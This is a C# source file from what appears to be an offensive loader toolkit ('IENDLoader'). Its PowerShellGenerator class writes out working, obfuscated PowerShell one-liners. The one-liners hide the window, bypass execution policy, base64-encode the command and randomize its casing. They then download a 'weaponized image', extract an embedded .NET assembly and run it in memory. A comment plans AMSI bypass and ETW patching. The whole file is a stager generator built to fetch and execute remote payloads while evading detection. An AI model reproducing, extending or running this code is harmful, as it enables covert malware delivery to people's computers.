using System;
using System.Linq;
using System.Text;

namespace IENDLoader.Core
{
    /// <summary>
    /// Generates obfuscated PowerShell one-liners for payload execution
    /// </summary>
    public class PowerShellGenerator
    {
        private readonly Random _random = new Random();

        /// <summary>
        /// Generates a stealthy PowerShell one-liner with obfuscation
        /// </summary>
        /// <param name="imageUrl">URL where the weaponized image is hosted</param>
        /// <param name="autoDiscoverEntryPoint">If true, auto-discovers Main method. If false, uses manual entry point</param>
        /// <param name="manualEntryPoint">Manual entry point (e.g., "Client.Program.Main")</param>
        public string GenerateCommand(string imageUrl, bool autoDiscoverEntryPoint = true, string? manualEntryPoint = null)
        {
            if (string.IsNullOrWhiteSpace(imageUrl))
                throw new ArgumentException("Image URL cannot be empty", nameof(imageUrl));

            // Generate random variable names for obfuscation
            var vars = GenerateRandomVariables(9);

            string inlineScript;

            if (autoDiscoverEntryPoint)
            {
                // Auto-discovery mode with maximum stealth
                inlineScript = GenerateAutoDiscoveryScript(imageUrl, vars);
            }
            else
            {
                // Manual entry point mode
                if (string.IsNullOrWhiteSpace(manualEntryPoint))
                    manualEntryPoint = "Client.Program.Main";

                inlineScript = GenerateManualEntryPointScript(imageUrl, manualEntryPoint, vars);
            }

            // Encode the script as UTF-16LE (Unicode) Base64 for -EncodedCommand
            string encoded = EncodeForEncodedCommand(inlineScript);

            // Light polymorphism: randomize casing of engine and parameters
            string ps = RandCase("powershell.exe");
            string noP = RandCase("-NoP");
            string nonI = RandCase("-NonI");
            string w = RandCase("-W");
            string ep = RandCase("-Ep");
            string enc = RandCase("-Enc");

            return $"{ps} {noP} {nonI} {w} 1 {ep} Bypass {enc} {encoded}";
        }

        /// <summary>
        /// Generates script with automatic entry point discovery
        /// </summary>
        private string GenerateAutoDiscoveryScript(string url, string[] vars)
        {
            return $"${vars[0]}=New-Object Net.WebClient;" +
                   $"${vars[0]}.Encoding=[Text.Encoding]::UTF8;" +
                   $"${vars[1]}=${vars[0]}.DownloadString('{url}');" +
                   $"if(${vars[1]}-match('Ba'+'se'+'Start'+'-'+'(.*)'+'-'+'Ba'+'se'+'End')){{" +
                   $"${vars[2]}=$matches[1];" +
                   $"${vars[3]}=[Convert]::('From'+'Base'+'64String').Invoke(${vars[2]});" +
                   $"${vars[4]}=[Reflection.Assembly]::('Lo'+'ad').Invoke(${vars[3]});" +
                   $"${vars[5]}=${vars[4]}.EntryPoint;" +
                   $"if(!${vars[5]}){{" +
                   $"${vars[4]}.GetTypes()|%{{" +
                   $"${vars[6]}=$_;" +
                   $"${vars[6]}.GetMethods([Reflection.BindingFlags]'Static,Public,NonPublic')|?{{$_.Name-eq('Ma'+'in')}}|%{{${vars[5]}=$_}}" +
                   $"}}" +
                   $"}};" +
                   $"if(${vars[5]}){{" +
                   $"${vars[7]}=${vars[5]}.GetParameters();" +
                   $"if(${vars[7]}.Length-eq0){{${vars[5]}.Invoke($null,$null)}}else{{${vars[5]}.Invoke($null,@(,[string[]]@()))}}" +
                   $"}}" +
                   $"}}";
        }

        /// <summary>
        /// Generates script with manual entry point
        /// </summary>
        private string GenerateManualEntryPointScript(string url, string entryPoint, string[] vars)
        {
            var parts = entryPoint.Split('.');
            if (parts.Length < 2)
                throw new ArgumentException("Entry point must be in format: Namespace.Class.Method", nameof(entryPoint));

            string methodName = parts[^1];
            string typeName = string.Join(".", parts[..^1]);

            return $"${vars[0]}=New-Object Net.WebClient;" +
                   $"${vars[0]}.Encoding=[Text.Encoding]::UTF8;" +
                   $"${vars[1]}=${vars[0]}.DownloadString('{url}');" +
                   $"if(${vars[1]}-match('Ba'+'se'+'Start'+'-'+'(.*)'+'-'+'Ba'+'se'+'End')){{" +
                   $"${vars[2]}=$matches[1];" +
                   $"${vars[3]}=[Convert]::('From'+'Base'+'64String').Invoke(${vars[2]});" +
                   $"${vars[4]}=[Reflection.Assembly]::('Lo'+'ad').Invoke(${vars[3]});" +
                   $"${vars[5]}=${vars[4]}.GetType('{typeName}');" +
                   $"if(${vars[5]}){{" +
                   $"${vars[6]}=${vars[5]}.GetMethod('{methodName}',[Reflection.BindingFlags]'Static,Public,NonPublic');" +
                   $"if(${vars[6]}){{" +
                   $"${vars[7]}=${vars[6]}.GetParameters();" +
                   $"if(${vars[7]}.Length-eq0){{${vars[6]}.Invoke($null,$null)}}else{{${vars[6]}.Invoke($null,@(,[string[]]@()))}}" +
                   $"}}" +
                   $"}}" +
                   $"}}";
        }

        /// <summary>
        /// Generates random 2-letter variable names
        /// </summary>
        private string[] GenerateRandomVariables(int count)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            var variables = new string[count];

            for (int i = 0; i < count; i++)
            {
                variables[i] = new string(Enumerable.Range(0, 2)
                    .Select(_ => chars[_random.Next(chars.Length)])
                    .ToArray());
            }

            return variables;
        }

        /// <summary>
        /// Encode a PowerShell script for -EncodedCommand (UTF-16LE -> Base64)
        /// </summary>
        private static string EncodeForEncodedCommand(string script)
        {
            // Important: PowerShell expects Unicode (UTF-16LE)
            var bytes = Encoding.Unicode.GetBytes(script);
            return Convert.ToBase64String(bytes);
        }

        /// <summary>
        /// Returns a version of the input string with randomized casing for light polymorphism
        /// </summary>
        private string RandCase(string s)
        {
            var sb = new StringBuilder(s.Length);
            for (int i = 0; i < s.Length; i++)
            {
                char c = s[i];
                if (char.IsLetter(c))
                {
                    sb.Append(_random.Next(2) == 0 ? char.ToLowerInvariant(c) : char.ToUpperInvariant(c));
                }
                else
                {
                    sb.Append(c);
                }
            }
            return sb.ToString();
        }

        /// <summary>
        /// Generates a more advanced obfuscated command with additional layers
        /// </summary>
        public string GenerateAdvancedCommand(string imageUrl, bool autoDiscoverEntryPoint = true, string? manualEntryPoint = null)
        {
            // Future enhancement: Add AMSI bypass, ETW patching, etc.
            // For now, returns standard command
            return GenerateCommand(imageUrl, autoDiscoverEntryPoint, manualEntryPoint);
        }
    }
}
